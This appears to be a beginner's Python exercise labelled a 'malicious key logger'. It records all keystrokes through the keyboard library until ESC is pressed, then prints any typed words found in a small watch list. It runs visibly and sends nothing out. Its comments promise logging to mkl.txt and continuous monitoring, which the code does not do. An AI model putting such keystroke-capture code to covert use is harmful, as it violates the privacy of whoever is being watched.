#MKL = Mallicieous key logger 
# in this script you should run your python file once and keep it running 
# until explicitly you terminate program from from cmd using ctrl+c
#
#you should define static array of bad,abusive,etc etc words
#
# This script should continuesly monitor which key is getting pressed on keyboard
# and based on that form a word if it gets ound malliceous words list then simply 
# log a single line message at the end of mkl.txt file
import keyboard
import time
bhangar_words=["instagram","snapchat","hacker"]
print("Press ESC to stop recording")
keyboard.start_recording()
keyboard.wait('esc')
events = keyboard.stop_recording()
#keyboard.replay(events)


current_word = ""
word_start_time = None

for i in events:
    if i.event_type == 'down':

      if len(i.name) == 1:
        if current_word == "":
            word_start_time = i.time
        current_word += i.name.lower()

      elif i.name == 'backspace':
            current_word = current_word[:-1]

      elif i.name in ['space', 'enter']:
            if current_word in bhangar_words:
                readable = time.strftime("%H:%M:%S", time.localtime(word_start_time))
                print(f"Found: {current_word} at {readable}")
            current_word = ""
            word_start_time = None

if current_word in bhangar_words:
    readable = time.strftime("%H:%M:%S", time.localtime(word_start_time))
    print(f"Found: {current_word} at {readable}")
